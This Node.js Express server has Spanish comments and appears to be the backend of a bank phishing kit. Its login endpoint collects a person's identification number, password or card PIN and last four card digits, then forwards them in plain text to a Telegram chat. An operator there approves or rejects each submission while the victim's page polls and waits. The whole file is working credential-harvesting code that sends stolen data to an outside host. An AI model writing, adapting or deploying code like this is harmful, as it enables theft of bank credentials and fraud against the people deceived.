import express from 'express';
import axios from 'axios';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
app.use(cors()); // Permite peticiones desde tu front en otro dominio
app.use(express.json());

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

// Almacenamiento en memoria para los estados y datos
// Estructura: { requestId: { status: 'pending'|'approved'|'rejected', data: {...}, messageId: null } }
const requestsDB = new Map();

// Función para enviar el mensaje a Telegram con los botones
async function sendToTelegram(requestId, data) {
    const isTarjeta = data.tipo === 'tarjeta';
    
    // Construimos el texto con formato HTML
    let text = `<b>⚠️ NUEVA SOLICITUD DE VALIDACIÓN</b>\n\n`;
    text += `<b>Identificación:</b> ${data.identificacion}\n`;
    
    if (isTarjeta) {
        text += `<b>Clave Tarjeta:</b> ${data.clave}\n`;
        text += `<b>Últimos 4 dígitos:</b> ${data.ultimos4}\n`;
    } else {
        text += `<b>Clave Segura:</b> ${data.clave}\n`;
    }
    
    text += `\n<i>El usuario está esperando respuesta...</i>`;

    // Botones Inline
    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Aprobar", callback_data: `approve_${requestId}` },
                { text: "❌ Rechazar", callback_data: `reject_${requestId}` }
            ]
        ]
    };

    try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
        
        // Guardamos el ID del mensaje de Telegram por si lo necesitamos luego
        requestsDB.get(requestId).messageId = response.data.result.message_id;
        console.log(`Mensaje enviado a Telegram para requestId: ${requestId}`);
        
    } catch (error) {
        console.error("Error enviando a Telegram:", error.response?.data || error.message);
    }
}

// 1. Endpoint que recibe los datos del front
app.post('/api/login', async (req, res) => {
    const { identificacion, clave, ultimos4, tipo } = req.body;

    // Validaciones básicas
    if (!identificacion || !clave) {
        return res.status(400).json({ error: "Faltan datos requeridos." });
    }

    // Generamos un ID único para esta solicitud
    const requestId = Date.now().toString() + Math.random().toString(36).substring(2, 7);
    
    // Guardamos en memoria
    requestsDB.set(requestId, {
        status: 'pending',
        data: { identificacion, clave, ultimos4, tipo },
        messageId: null
    });

    // Enviamos a Telegram asíncronamente
    sendToTelegram(requestId, { identificacion, clave, ultimos4, tipo });

    // Respondemos inmediatamente al front con el ID
    res.json({ requestId });
});

// 2. Endpoint de Polling (El front pregunta cada 2 segundos)
app.get('/api/status/:requestId', (req, res) => {
    const { requestId } = req.params;
    const request = requestsDB.get(requestId);

    if (!request) {
        // Si no existe, asumimos que ya se procesó y se limpió, o es inválido
        return res.status(404).json({ status: 'error', message: 'Solicitud no encontrada' });
    }

    res.json({ status: request.status });
});

// 3. Webhook de Telegram (Para recibir los clics de los botones)
app.post('/api/webhook/telegram', async (req, res) => {
    const { callback_query } = req.body;

    if (!callback_query) {
        return res.sendStatus(200); // Ignorar si no es un callback
    }

    const data = callback_query.data; // Ej: "approve_123456"
    const messageId = callback_query.message.message_id;
    const chatId = callback_query.message.chat.id;

    // Extraemos la acción y el requestId
    const [action, requestId] = data.split('_');

    // Verificamos que la solicitud exista
    if (requestsDB.has(requestId)) {
        const request = requestsDB.get(requestId);
        
        // Actualizamos el estado
        request.status = action === 'approve' ? 'approved' : 'rejected';

        // Editamos el mensaje de Telegram para quitar los botones y mostrar quién lo hizo
        const actionText = action === 'approve' ? '✅ <b>APROBADO</b>' : '❌ <b>RECHAZADO</b>';
        
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: chatId,
                message_id: messageId,
                text: `${actionText}\n\n<i>El usuario ha sido notificado.</i>`,
                parse_mode: 'HTML'
            });
        } catch (error) {
            console.error("Error editando mensaje de Telegram:", error.message);
        }

        // Respondemos a Telegram para detener el spinner del botón
        res.sendStatus(200);
    } else {
        // Si no existe en memoria (ya se limpió o expiró)
        res.sendStatus(404);
    }
});

// Ruta de salud para Render
app.get('/', (req, res) => {
    res.send('Backend funcionando correctamente.');
});

app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
